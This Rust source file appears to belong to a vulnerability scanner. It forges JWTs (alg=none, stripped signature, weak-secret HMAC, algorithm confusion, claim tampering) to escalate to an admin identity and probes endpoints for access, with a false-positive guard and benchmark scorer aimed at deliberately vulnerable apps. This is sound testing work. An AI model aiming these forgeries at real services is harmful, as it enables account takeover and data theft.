//! A1 — JWT / auth-token flaw finder (first `ActiveFinder` implementation).
//!
//! Generalizes the DVGA `verify_signature=False` bug (already exploited in the
//! corpus) into an active finder, plus VAmPI's weak-HMAC-secret bypass and the
//! other classic JWT forgeries. Each technique is attempted as a SEPARATE proof.
//!
//! The proof is always [`ProofKind::ForgedTokenAccess`]: a forged/tampered token
//! accesses a resource the ORIGINAL identity could not. Concretely
//! ([`forged_access_proven`]): the forged response is success-like AND carries a
//! victim-identity marker, the control (original identity) response does NOT
//! carry that marker, AND an anonymous request does NOT carry it either (so a
//! "working" forged request against a PUBLIC endpoint proves nothing). A forged
//! token that is rejected, or that returns the same data anyone already gets, is
//! `Rejected` — never `Verified`. Tokens are redacted in sealed evidence.

use base64::Engine;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use std::collections::BTreeMap;

use crate::active_finder::{
    ActiveFinder, ActiveProof, FinderContext, FinderDecision, ProbeObservation, ProofKind,
};
use crate::evaluation::{
    BenchmarkCase, BenchmarkConfig, BenchmarkDifficulty, BenchmarkDomain, BenchmarkResult,
    BenchmarkRun, BenchmarkSuite, GroundTruthLabel,
};
use crate::web_api::{HttpMethod, HttpRequestSpec, RejectedHypothesis};

// =============================================================================
// JWT forging primitives (no new deps: base64 + sha2, HMAC implemented here).
// =============================================================================

fn b64url(bytes: &[u8]) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(bytes)
}

fn b64url_decode(s: &str) -> Option<Vec<u8>> {
    base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(s.trim())
        .ok()
}

/// HMAC-SHA256 (RFC 2104) implemented over `sha2` so we add no `hmac` dep.
fn hmac_sha256(key: &[u8], msg: &[u8]) -> [u8; 32] {
    const BLOCK: usize = 64;
    let mut k = if key.len() > BLOCK {
        let mut h = Sha256::new();
        h.update(key);
        h.finalize().to_vec()
    } else {
        key.to_vec()
    };
    k.resize(BLOCK, 0);
    let mut ipad = [0x36u8; BLOCK];
    let mut opad = [0x5cu8; BLOCK];
    for i in 0..BLOCK {
        ipad[i] ^= k[i];
        opad[i] ^= k[i];
    }
    let mut inner = Sha256::new();
    inner.update(ipad);
    inner.update(msg);
    let inner = inner.finalize();
    let mut outer = Sha256::new();
    outer.update(opad);
    outer.update(inner);
    outer.finalize().into()
}

fn header_payload(alg: &str, claims: &serde_json::Value) -> (String, String) {
    let header = serde_json::json!({ "alg": alg, "typ": "JWT" });
    let h = b64url(serde_json::to_vec(&header).unwrap_or_default().as_slice());
    let p = b64url(serde_json::to_vec(claims).unwrap_or_default().as_slice());
    (h, p)
}

/// `alg=none` token: header + payload + empty signature segment.
pub fn forge_alg_none(claims: &serde_json::Value) -> String {
    let (h, p) = header_payload("none", claims);
    format!("{h}.{p}.")
}

/// HS256 token signed with `secret` (used for weak-secret and alg-confusion).
pub fn forge_hs256(claims: &serde_json::Value, secret: &[u8]) -> String {
    let (h, p) = header_payload("HS256", claims);
    let signing_input = format!("{h}.{p}");
    let sig = hmac_sha256(secret, signing_input.as_bytes());
    format!("{signing_input}.{}", b64url(&sig))
}

/// A token whose payload is the given claims but whose signature is a bogus
/// fixed segment — accepted only by servers that do not verify signatures.
pub fn forge_stripped_signature(claims: &serde_json::Value) -> String {
    let (h, p) = header_payload("HS256", claims);
    format!("{h}.{p}.AAAABBBBCCCC")
}

/// Claim-tamper an EXISTING token: replace its payload claims but keep its
/// original header and signature bytes. Accepted only where signatures are not
/// verified (proves "tamper an issued token", distinct from minting fresh).
pub fn forge_claim_tamper(original_token: &str, claims: &serde_json::Value) -> Option<String> {
    let mut parts = original_token.split('.');
    let header = parts.next()?;
    let _old_payload = parts.next()?;
    let sig = parts.next().unwrap_or("");
    let p = b64url(serde_json::to_vec(claims).ok()?.as_slice());
    Some(format!("{header}.{p}.{sig}"))
}

/// Decode a JWT payload (no verification) for claim tampering / inspection.
pub fn decode_payload(token: &str) -> Option<serde_json::Value> {
    let payload = token.split('.').nth(1)?;
    serde_json::from_slice(&b64url_decode(payload)?).ok()
}

// =============================================================================
// Finder configuration.
// =============================================================================

/// How the token is carried into a request to the protected endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TokenInjection {
    /// `Authorization: Bearer <token>` (REST APIs, e.g. VAmPI).
    BearerHeader,
    /// Token substituted into a GraphQL query (the `{TOKEN}` placeholder),
    /// POSTed as `{"query": ...}` (e.g. DVGA's `me(token:"...")`).
    GraphQlArg {
        query_template: String,
        #[serde(default)]
        extra_headers: Vec<(String, String)>,
    },
}

/// A forgery technique to attempt. Each is a separate proof.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ForgeTechnique {
    AlgNone,
    StripSignature,
    WeakSecretHmac,
    AlgConfusion,
    ClaimTamper,
}

/// Everything the [`JwtAuthFinder`] needs for one protected endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtAuthCase {
    pub label: String,
    pub url: String,
    pub method: HttpMethod,
    pub injection: TokenInjection,
    /// A valid token for the ORIGINAL (non-victim) identity, used as the control.
    /// `None` means the control is an anonymous request.
    pub control_token: Option<String>,
    /// The claim key to escalate (e.g. `"sub"` for VAmPI, `"identity"` for DVGA).
    pub escalate_key: String,
    /// The victim identity to escalate to (e.g. `"admin"`).
    pub escalate_value: String,
    /// Extra claims merged into every forged payload (e.g. `exp`, `iat`).
    #[serde(default)]
    pub extra_claims: serde_json::Value,
    pub techniques: Vec<ForgeTechnique>,
    #[serde(default)]
    pub weak_secret_wordlist: Vec<String>,
    #[serde(default)]
    pub rs256_public_key: Option<String>,
    /// Strings that appear ONLY when the victim's resource is actually accessed
    /// (e.g. the admin password, the admin email).
    pub victim_markers: Vec<String>,
}

impl JwtAuthCase {
    fn forged_claims(&self) -> serde_json::Value {
        let mut claims = match &self.extra_claims {
            serde_json::Value::Object(_) => self.extra_claims.clone(),
            _ => serde_json::json!({}),
        };
        if let Some(obj) = claims.as_object_mut() {
            obj.insert(
                self.escalate_key.clone(),
                serde_json::Value::String(self.escalate_value.clone()),
            );
        }
        claims
    }

    /// Build the forged token for a technique. Returns None if the technique is
    /// not applicable (e.g. weak-secret with no wordlist hit is handled by the
    /// finder which tries each secret; alg-confusion with no key).
    fn forge(&self, technique: ForgeTechnique, secret: Option<&str>) -> Option<String> {
        let claims = self.forged_claims();
        match technique {
            ForgeTechnique::AlgNone => Some(forge_alg_none(&claims)),
            ForgeTechnique::StripSignature => Some(forge_stripped_signature(&claims)),
            ForgeTechnique::WeakSecretHmac => Some(forge_hs256(&claims, secret?.as_bytes())),
            ForgeTechnique::AlgConfusion => Some(forge_hs256(
                &claims,
                self.rs256_public_key.as_ref()?.as_bytes(),
            )),
            ForgeTechnique::ClaimTamper => {
                forge_claim_tamper(self.control_token.as_ref()?, &claims)
            }
        }
    }
}

// =============================================================================
// The deterministic proof guard — the mutation-checked core.
// =============================================================================

/// The three observations that decide whether a forgery is proven.
#[derive(Debug, Clone)]
pub struct JwtAttempt {
    pub technique: ForgeTechnique,
    pub forged: ProbeObservation,
    pub control: ProbeObservation,
    pub anonymous: ProbeObservation,
}

fn body_has_marker(obs: &ProbeObservation, markers: &[String]) -> bool {
    markers
        .iter()
        .any(|m| !m.is_empty() && obs.body.contains(m.as_str()))
}

fn is_success(status: u16) -> bool {
    (200..300).contains(&status)
}

/// THE guard. A forgery is proven ONLY when the forged token reaches the
/// victim's data that neither the original identity nor an anonymous caller can.
///
/// This is the firewall for the JWT class: removing any clause turns an
/// accepted-but-meaningless request into a false positive (see the mutation
/// check in tests).
pub fn forged_access_proven(attempt: &JwtAttempt, victim_markers: &[String]) -> bool {
    let forged_succeeded = is_success(attempt.forged.status);
    let forged_has_victim = body_has_marker(&attempt.forged, victim_markers);
    let control_lacks_victim = !body_has_marker(&attempt.control, victim_markers);
    let anonymous_lacks_victim = !body_has_marker(&attempt.anonymous, victim_markers);

    forged_succeeded && forged_has_victim && control_lacks_victim && anonymous_lacks_victim
}

// =============================================================================
// The finder.
// =============================================================================

/// First `ActiveFinder`: proves JWT/auth-token forgery via cross-identity access.
pub struct JwtAuthFinder {
    case: JwtAuthCase,
}

impl JwtAuthFinder {
    pub fn new(case: JwtAuthCase) -> Self {
        Self { case }
    }

    /// Send a request carrying `token` (or none) via the case's injection.
    fn send_with_token(
        &self,
        ctx: &mut FinderContext,
        id: &str,
        token: Option<&str>,
    ) -> Result<ProbeObservation, crate::active_finder::FinderError> {
        match &self.case.injection {
            TokenInjection::BearerHeader => {
                let spec = HttpRequestSpec {
                    id: id.to_string(),
                    profile: "jwt-finder".to_string(),
                    method: self.case.method.clone(),
                    url: self.case.url.clone(),
                    bearer_token: token.map(String::from),
                    cookies: vec![],
                    headers: vec![],
                    csrf_token_header: None,
                    csrf_token: None,
                };
                ctx.send(&spec)
            }
            TokenInjection::GraphQlArg {
                query_template,
                extra_headers,
            } => {
                let query = query_template.replace("{TOKEN}", token.unwrap_or(""));
                let spec = HttpRequestSpec {
                    id: id.to_string(),
                    profile: "jwt-finder".to_string(),
                    method: HttpMethod::Post,
                    url: self.case.url.clone(),
                    bearer_token: None,
                    cookies: vec![],
                    headers: extra_headers.clone(),
                    csrf_token_header: None,
                    csrf_token: None,
                };
                let body = serde_json::json!({ "query": query });
                ctx.send_json(&spec, &body)
            }
        }
    }
}

impl ActiveFinder for JwtAuthFinder {
    fn name(&self) -> &str {
        "jwt-auth"
    }

    fn vuln_class(&self) -> &str {
        "JwtAuthBypass"
    }

    fn probe(&self, ctx: &mut FinderContext) -> FinderDecision {
        // Control (original identity) and anonymous baselines — computed once.
        let control =
            match self.send_with_token(ctx, "jwt-control", self.case.control_token.as_deref()) {
                Ok(o) => o,
                Err(e) => {
                    return FinderDecision::Inconclusive(format!("control request failed: {e}"))
                }
            };
        let anonymous = match self.send_with_token(ctx, "jwt-anon", None) {
            Ok(o) => o,
            Err(e) => {
                return FinderDecision::Inconclusive(format!("anonymous request failed: {e}"))
            }
        };

        // If the victim marker is ALREADY visible to the control or to anonymous,
        // there is no auth boundary to bypass — bail before forging.
        if body_has_marker(&control, &self.case.victim_markers) {
            return FinderDecision::Rejected(RejectedHypothesis {
                reason: "the original identity already sees the victim data — no escalation"
                    .to_string(),
                observations: vec![format!("control_status={}", control.status)],
            });
        }
        if body_has_marker(&anonymous, &self.case.victim_markers) {
            return FinderDecision::Rejected(RejectedHypothesis {
                reason:
                    "victim data is reachable anonymously — endpoint is public, not an auth bypass"
                        .to_string(),
                observations: vec![format!("anonymous_status={}", anonymous.status)],
            });
        }

        let mut attempted = Vec::new();
        for technique in &self.case.techniques {
            // Build the forged token(s) for this technique.
            let tokens: Vec<(String, String)> = match technique {
                ForgeTechnique::WeakSecretHmac => self
                    .case
                    .weak_secret_wordlist
                    .iter()
                    .filter_map(|secret| {
                        self.case
                            .forge(*technique, Some(secret))
                            .map(|t| (format!("weak-secret:{secret}"), t))
                    })
                    .collect(),
                _ => self
                    .case
                    .forge(*technique, None)
                    .map(|t| vec![(format!("{technique:?}"), t)])
                    .unwrap_or_default(),
            };
            if tokens.is_empty() {
                attempted.push(format!("{technique:?}=not-applicable"));
                continue;
            }
            for (variant, token) in tokens {
                let forged =
                    match self.send_with_token(ctx, &format!("jwt-forged-{variant}"), Some(&token))
                    {
                        Ok(o) => o,
                        Err(crate::active_finder::FinderError::BudgetExhausted { detail }) => {
                            return FinderDecision::Inconclusive(format!(
                                "budget exhausted mid-scan: {detail}"
                            ));
                        }
                        Err(e) => {
                            attempted.push(format!("{variant}=transport-error({e})"));
                            continue;
                        }
                    };
                let attempt = JwtAttempt {
                    technique: *technique,
                    forged: forged.clone(),
                    control: control.clone(),
                    anonymous: anonymous.clone(),
                };
                if forged_access_proven(&attempt, &self.case.victim_markers) {
                    let markers: Vec<String> = self
                        .case
                        .victim_markers
                        .iter()
                        .filter(|m| forged.body.contains(m.as_str()))
                        .cloned()
                        .collect();
                    return FinderDecision::Verified(ActiveProof {
                        finder: self.name().to_string(),
                        vuln_class: self.vuln_class().to_string(),
                        title: format!(
                            "JWT auth bypass via {technique:?}: forged `{}={}` token accessed victim resource",
                            self.case.escalate_key, self.case.escalate_value
                        ),
                        target: self.case.url.clone(),
                        proof_kind: ProofKind::ForgedTokenAccess,
                        evidence_ids: vec![
                            control.id.clone(),
                            anonymous.id.clone(),
                            forged.id.clone(),
                        ],
                        evidence_markers: markers,
                        // Token is NOT included — only the variant label, redacted.
                        detail: format!(
                            "technique={technique:?} variant={variant}; forged_status={} control_status={} anon_status={}; \
                             forged token REDACTED",
                            forged.status, control.status, anonymous.status
                        ),
                    });
                }
                attempted.push(format!(
                    "{variant}=rejected(status={},victim_marker={})",
                    forged.status,
                    body_has_marker(&forged, &self.case.victim_markers)
                ));
            }
        }

        FinderDecision::Rejected(RejectedHypothesis {
            reason: "no forgery technique achieved cross-identity access to victim data"
                .to_string(),
            observations: attempted,
        })
    }
}

// =============================================================================
// Benchmark scorer — one scenario per (target, endpoint); decision => label.
// =============================================================================

/// A hand-labelled JWT scenario: the runner builds a [`JwtAuthCase`] from it,
/// runs the finder, and the scorer compares the verdict to `expected_label`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtScenario {
    pub id: String,
    pub endpoint: String,
    pub technique: String,
    pub escalate_to: String,
    pub expected_label: String,
    #[serde(default)]
    pub rationale: String,
    #[serde(default)]
    pub victim_markers: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtGroundTruth {
    pub case_id: String,
    pub description: String,
    pub ground_truth_version: u32,
    pub source: String,
    #[serde(default)]
    pub source_commit: String,
    #[serde(default)]
    pub license: String,
    #[serde(default)]
    pub vulnerabilities: Vec<JwtScenario>,
    #[serde(default)]
    pub decoys: Vec<JwtScenario>,
}

impl JwtGroundTruth {
    pub fn all_scenarios(&self) -> Vec<&JwtScenario> {
        self.vulnerabilities
            .iter()
            .chain(self.decoys.iter())
            .collect()
    }

    pub fn load_from<P: AsRef<std::path::Path>>(path: P) -> Result<Self, String> {
        let raw = std::fs::read_to_string(path.as_ref())
            .map_err(|e| format!("read {}: {e}", path.as_ref().display()))?;
        serde_json::from_str(&raw).map_err(|e| format!("parse {}: {e}", path.as_ref().display()))
    }
}

fn label_from_str(s: &str) -> GroundTruthLabel {
    match s {
        "TruePositive" => GroundTruthLabel::TruePositive,
        "TrueNegative" => GroundTruthLabel::TrueNegative,
        "FalsePositive" => GroundTruthLabel::FalsePositive,
        "FalseNegative" => GroundTruthLabel::FalseNegative,
        _ => GroundTruthLabel::Inconclusive,
    }
}

/// Map (expected label, did the finder Verify?) to a prediction. A finder that
/// Verifies a decoy is a FalsePositive; one that fails to Verify a planted bug
/// is a FalseNegative.
pub fn jwt_prediction(expected: GroundTruthLabel, verified: bool) -> GroundTruthLabel {
    match (expected, verified) {
        (GroundTruthLabel::TruePositive, true) => GroundTruthLabel::TruePositive,
        (GroundTruthLabel::TruePositive, false) => GroundTruthLabel::FalseNegative,
        (GroundTruthLabel::TrueNegative, true) => GroundTruthLabel::FalsePositive,
        (GroundTruthLabel::TrueNegative, false) => GroundTruthLabel::TrueNegative,
        (GroundTruthLabel::FalsePositive, true) => GroundTruthLabel::FalsePositive,
        (GroundTruthLabel::FalsePositive, false) => GroundTruthLabel::TrueNegative,
        (GroundTruthLabel::FalseNegative, true) => GroundTruthLabel::TruePositive,
        (GroundTruthLabel::FalseNegative, false) => GroundTruthLabel::FalseNegative,
        (GroundTruthLabel::Inconclusive, _) => GroundTruthLabel::Inconclusive,
    }
}

/// Build the `BenchmarkSuite` paired 1:1 with a `JwtGroundTruth`.
pub fn jwt_suite(gt: &JwtGroundTruth) -> BenchmarkSuite {
    let mut cases = Vec::new();
    for s in gt.all_scenarios() {
        let is_decoy = gt.decoys.iter().any(|d| d.id == s.id);
        let mut tags = vec!["jwt".to_string(), s.technique.to_lowercase()];
        if is_decoy {
            tags.push("decoy".to_string());
        }
        cases.push(BenchmarkCase {
            case_id: s.id.clone(),
            domain: BenchmarkDomain::WebApi,
            name: s.id.clone(),
            description: s.rationale.clone(),
            target: s.endpoint.clone(),
            ground_truth: label_from_str(&s.expected_label),
            expected_classification: Some("JwtAuthBypass".to_string()),
            expected_severity: None,
            expected_evidence_keys: s.victim_markers.clone(),
            difficulty: BenchmarkDifficulty::Moderate,
            tags,
            fixture_path: None,
            metadata: BTreeMap::new(),
        });
    }
    BenchmarkSuite {
        suite_id: format!("baloncore-{}-v1", gt.case_id),
        name: format!("JWT auth-bypass finder: {}", gt.case_id),
        version: "1.0.0".to_string(),
        domain: BenchmarkDomain::WebApi,
        description: gt.description.clone(),
        cases,
        metadata: {
            let mut m = BTreeMap::new();
            m.insert("source".to_string(), gt.source.clone());
            m.insert("source_commit".to_string(), gt.source_commit.clone());
            m.insert("license".to_string(), gt.license.clone());
            m
        },
    }
}

/// Score a JWT bench run. `verified` maps each scenario id to whether the
/// `JwtAuthFinder` returned `Verified`. A scenario with no entry (the finder
/// never ran it) scores `Inconclusive`. The scorer never uses the label to
/// decide `verified` — that comes only from the finder's real decision.
pub fn score_jwt_run(
    verified: &BTreeMap<String, bool>,
    gt: &JwtGroundTruth,
    suite: &BenchmarkSuite,
) -> BenchmarkRun {
    let mut results = Vec::new();
    for s in gt.all_scenarios() {
        let expected = label_from_str(&s.expected_label);
        let (prediction, actual_state) = match verified.get(&s.id) {
            Some(v) => (
                jwt_prediction(expected, *v),
                Some(if *v { "verified" } else { "rejected" }.to_string()),
            ),
            None => (GroundTruthLabel::Inconclusive, Some("not-run".to_string())),
        };
        let confidence = if matches!(
            prediction,
            GroundTruthLabel::TruePositive | GroundTruthLabel::TrueNegative
        ) {
            1.0
        } else {
            0.0
        };
        results.push(BenchmarkResult {
            result_id: format!("result_{}", s.id),
            suite_id: suite.suite_id.clone(),
            case_id: s.id.clone(),
            domain: BenchmarkDomain::WebApi,
            actual_classification: verified.get(&s.id).map(|v| {
                if *v {
                    "JwtAuthBypass"
                } else {
                    "BlockedAsExpected"
                }
                .to_string()
            }),
            actual_severity: None,
            actual_state,
            prediction,
            confidence,
            evidence_found: Vec::new(),
            time_to_result_ms: 0,
            error: verified
                .get(&s.id)
                .is_none()
                .then(|| format!("scenario {} was not run", s.id)),
        });
    }
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    BenchmarkRun {
        run_id: format!("bench-jwt-{}-{}", gt.case_id, now),
        suite_id: suite.suite_id.clone(),
        suite_version: suite.version.clone(),
        domain: suite.domain.clone(),
        started_at: now,
        completed_at: now,
        config_snapshot: BenchmarkConfig {
            engine_version: env!("CARGO_PKG_VERSION").to_string(),
            validator_config: "JwtAuthFinder(ActiveFinder)".to_string(),
            noise_mode: "moderate".to_string(),
            max_active_requests: 500,
            domain_filter: None,
            difficulty_filter: None,
            tag_filter: None,
            metadata: {
                let mut m = BTreeMap::new();
                m.insert("source".to_string(), gt.source.clone());
                m.insert("source_commit".to_string(), gt.source_commit.clone());
                m.insert("benchmark_path".to_string(), "real-scan".to_string());
                m
            },
            provider: "fixture".to_string(),
            model: "n/a (deterministic finder)".to_string(),
            prompt_version: "n/a".to_string(),
            git_commit: env!("CARGO_PKG_VERSION").to_string(),
            corpus_hash: format!("jwt-{}-v{}", gt.case_id, gt.ground_truth_version),
        },
        results,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn obs(status: u16, body: &str) -> ProbeObservation {
        ProbeObservation {
            id: "x".to_string(),
            url: "http://t/".to_string(),
            status,
            body: body.to_string(),
            elapsed_ms: 1,
        }
    }

    // --- forging primitives ---

    #[test]
    fn alg_none_token_is_well_formed_and_decodes() {
        let claims = serde_json::json!({ "identity": "admin" });
        let token = forge_alg_none(&claims);
        let parts: Vec<&str> = token.split('.').collect();
        assert_eq!(parts.len(), 3);
        assert!(parts[2].is_empty(), "alg=none has empty signature");
        let payload = decode_payload(&token).unwrap();
        assert_eq!(payload["identity"], "admin");
    }

    #[test]
    fn hs256_signature_is_deterministic_and_keyed() {
        let claims = serde_json::json!({ "sub": "admin" });
        let a = forge_hs256(&claims, b"random");
        let b = forge_hs256(&claims, b"random");
        let c = forge_hs256(&claims, b"different");
        assert_eq!(a, b, "same secret -> same signature");
        assert_ne!(a, c, "different secret -> different signature");
    }

    #[test]
    fn hmac_sha256_matches_known_rfc4231_vector() {
        // RFC 4231 test case 1: key=0x0b*20, data="Hi There".
        let key = [0x0bu8; 20];
        let mac = hmac_sha256(&key, b"Hi There");
        let hex: String = mac.iter().map(|b| format!("{b:02x}")).collect();
        assert_eq!(
            hex,
            "b0344c61d8db38535ca8afceaf0bf12b881dc200c9833da726e9376c2e32cff7"
        );
    }

    #[test]
    fn claim_tamper_keeps_signature_replaces_payload() {
        let original = forge_hs256(&serde_json::json!({ "identity": "operator" }), b"random");
        let orig_sig = original.split('.').nth(2).unwrap().to_string();
        let tampered =
            forge_claim_tamper(&original, &serde_json::json!({ "identity": "admin" })).unwrap();
        assert_eq!(
            tampered.split('.').nth(2).unwrap(),
            orig_sig,
            "sig preserved"
        );
        assert_eq!(decode_payload(&tampered).unwrap()["identity"], "admin");
    }

    // --- the proof guard (mutation-checked) ---

    #[test]
    fn guard_verifies_real_cross_identity_access() {
        // Forged admin token leaks "changeme"; control (operator) is masked;
        // anonymous errors. This is a true bypass.
        let attempt = JwtAttempt {
            technique: ForgeTechnique::AlgNone,
            forged: obs(200, r#"{"me":{"username":"admin","password":"changeme"}}"#),
            control: obs(200, r#"{"me":{"username":"operator","password":"******"}}"#),
            anonymous: obs(200, r#"{"errors":["no token"],"me":null}"#),
        };
        assert!(forged_access_proven(&attempt, &["changeme".to_string()]));
    }

    #[test]
    fn guard_rejects_public_endpoint_anonymous_also_sees_marker() {
        // The PUBLIC-endpoint decoy: forged request "works" (200 + marker) but
        // anonymous ALSO sees the marker -> not an auth bypass. THIS is the case
        // the mutation check breaks.
        let attempt = JwtAttempt {
            technique: ForgeTechnique::AlgNone,
            forged: obs(200, r#"[{"username":"admin","email":"admin@mail.com"}]"#),
            control: obs(200, r#"[{"username":"admin","email":"admin@mail.com"}]"#),
            anonymous: obs(200, r#"[{"username":"admin","email":"admin@mail.com"}]"#),
        };
        assert!(
            !forged_access_proven(&attempt, &["admin@mail.com".to_string()]),
            "public endpoint must NOT be flagged: anonymous already sees the marker"
        );
    }

    #[test]
    fn guard_rejects_when_forged_token_is_refused() {
        // Correctly-rejecting decoy: server verifies the signature, forged token
        // gets 401 with no victim marker.
        let attempt = JwtAttempt {
            technique: ForgeTechnique::AlgNone,
            forged: obs(401, r#"{"message":"Invalid token. Please log in again."}"#),
            control: obs(200, r#"{"sub":"operator"}"#),
            anonymous: obs(401, r#"{"message":"no token"}"#),
        };
        assert!(!forged_access_proven(
            &attempt,
            &["admin@mail.com".to_string()]
        ));
    }

    #[test]
    fn guard_rejects_accepted_but_no_victim_data() {
        // Forged token accepted (200) but the response does NOT contain the
        // victim marker (e.g. masked) -> "request accepted" is NOT proof.
        let attempt = JwtAttempt {
            technique: ForgeTechnique::WeakSecretHmac,
            forged: obs(200, r#"{"me":{"username":"operator","password":"******"}}"#),
            control: obs(200, r#"{"me":{"username":"operator","password":"******"}}"#),
            anonymous: obs(401, "no token"),
        };
        assert!(!forged_access_proven(&attempt, &["changeme".to_string()]));
    }

    #[test]
    fn jwt_prediction_matrix() {
        assert_eq!(
            jwt_prediction(GroundTruthLabel::TruePositive, true),
            GroundTruthLabel::TruePositive
        );
        assert_eq!(
            jwt_prediction(GroundTruthLabel::TruePositive, false),
            GroundTruthLabel::FalseNegative
        );
        assert_eq!(
            jwt_prediction(GroundTruthLabel::TrueNegative, true),
            GroundTruthLabel::FalsePositive
        );
        assert_eq!(
            jwt_prediction(GroundTruthLabel::TrueNegative, false),
            GroundTruthLabel::TrueNegative
        );
    }

    #[test]
    fn label_parse_roundtrip() {
        assert_eq!(
            label_from_str("TruePositive"),
            GroundTruthLabel::TruePositive
        );
        assert_eq!(
            label_from_str("TrueNegative"),
            GroundTruthLabel::TrueNegative
        );
    }

    // --- scorer ---

    fn scorer_gt() -> JwtGroundTruth {
        let s = |id: &str, label: &str| JwtScenario {
            id: id.to_string(),
            endpoint: "POST /graphql".to_string(),
            technique: "AlgNone".to_string(),
            escalate_to: "admin".to_string(),
            expected_label: label.to_string(),
            rationale: String::new(),
            victim_markers: vec![],
        };
        JwtGroundTruth {
            case_id: "jwt-dvga".to_string(),
            description: "fixture".to_string(),
            ground_truth_version: 1,
            source: "https://example".to_string(),
            source_commit: "abc".to_string(),
            license: "MIT".to_string(),
            vulnerabilities: vec![s("vuln-forge-admin", "TruePositive")],
            decoys: vec![
                s("decoy-public", "TrueNegative"),
                s("decoy-rejecting", "TrueNegative"),
            ],
        }
    }

    #[test]
    fn scorer_happy_path_vuln_verified_decoys_rejected() {
        let gt = scorer_gt();
        let suite = jwt_suite(&gt);
        let verified = BTreeMap::from([
            ("vuln-forge-admin".to_string(), true),
            ("decoy-public".to_string(), false),
            ("decoy-rejecting".to_string(), false),
        ]);
        let run = score_jwt_run(&verified, &gt, &suite);
        let by = |id: &str| run.results.iter().find(|r| r.case_id == id).unwrap();
        assert_eq!(
            by("vuln-forge-admin").prediction,
            GroundTruthLabel::TruePositive
        );
        assert_eq!(
            by("decoy-public").prediction,
            GroundTruthLabel::TrueNegative
        );
        assert_eq!(
            by("decoy-rejecting").prediction,
            GroundTruthLabel::TrueNegative
        );
    }

    #[test]
    fn scorer_flags_decoy_false_positive_and_gate_fails() {
        let gt = scorer_gt();
        let suite = jwt_suite(&gt);
        // The finder WRONGLY verified the public decoy.
        let verified = BTreeMap::from([
            ("vuln-forge-admin".to_string(), true),
            ("decoy-public".to_string(), true),
            ("decoy-rejecting".to_string(), false),
        ]);
        let run = score_jwt_run(&verified, &gt, &suite);
        let by = |id: &str| run.results.iter().find(|r| r.case_id == id).unwrap();
        assert_eq!(
            by("decoy-public").prediction,
            GroundTruthLabel::FalsePositive
        );
        let gate = crate::evaluation::eval_gate(&run, &suite, 0.0, 0, 1.0, None, None);
        assert!(
            !gate.passed,
            "decoy FP must fail the gate; {}",
            gate.summary
        );
        assert!(gate.summary.to_lowercase().contains("decoy"));
    }

    #[test]
    fn scorer_clean_run_passes_gate() {
        let gt = scorer_gt();
        let suite = jwt_suite(&gt);
        let verified = BTreeMap::from([
            ("vuln-forge-admin".to_string(), true),
            ("decoy-public".to_string(), false),
            ("decoy-rejecting".to_string(), false),
        ]);
        let run = score_jwt_run(&verified, &gt, &suite);
        let gate = crate::evaluation::eval_gate(&run, &suite, 0.70, 0, 0.10, None, None);
        assert!(gate.passed, "clean run must pass; {}", gate.summary);
    }
}
